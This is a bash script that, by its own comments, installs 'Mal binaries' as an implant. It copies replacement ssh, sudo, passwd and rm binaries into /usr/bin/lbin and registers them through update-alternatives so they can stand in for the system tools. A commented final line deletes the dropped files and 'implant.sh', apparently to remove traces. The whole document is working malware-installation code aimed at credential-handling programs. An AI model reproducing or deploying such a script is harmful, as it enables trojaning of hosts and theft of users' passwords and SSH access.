#!/bin/bash
# This script is Supposed to be bundled with the Mal binaries in the same directory.
#

sudo mkdir -p /usr/bin/lbin/
sudo mkdir -p /usr/bin/local/

sudo cp  ./ssh /usr/bin/lbin/ 
#sudo update-alternatives --install /usr/bin/lbin/ssh ssh /usr/bin/ssh 90
sudo update-alternatives --install /usr/bin/local/ssh ssh /usr/bin/lbin/ssh 90
sudo cp  ./sudo /usr/bin/lbin/
#sudo update-alternatives --install /usr/bin/lbin/sudo sudo /usr/bin/sudo 90
sudo update-alternatives --install /usr/bin/local/sudo sudo /usr/bin/lbin/sudo 90
sudo cp  ./passwd /usr/bin/lbin/
#sudo update-alternatives --install /usr/bin/lbin/passwd passwd /usr/bin/passwd 90
sudo update-alternatives --install /usr/bin/local/passwd passwd /usr/bin/lbin/passwd 90
sudo cp ./rm /usr/bin/lbin/
#sudo update-alternatives --install /usr/bin/lbin/rm rm /usr/bin/rm 90
sudo update-alternatives --install /usr/bin/local/rm rm /usr/bin/lbin/rm 90
#/usr/bin/sudo /usr/bin/rm -rf ./ssh ./sudo ./passwd ./rm ./implant.sh 
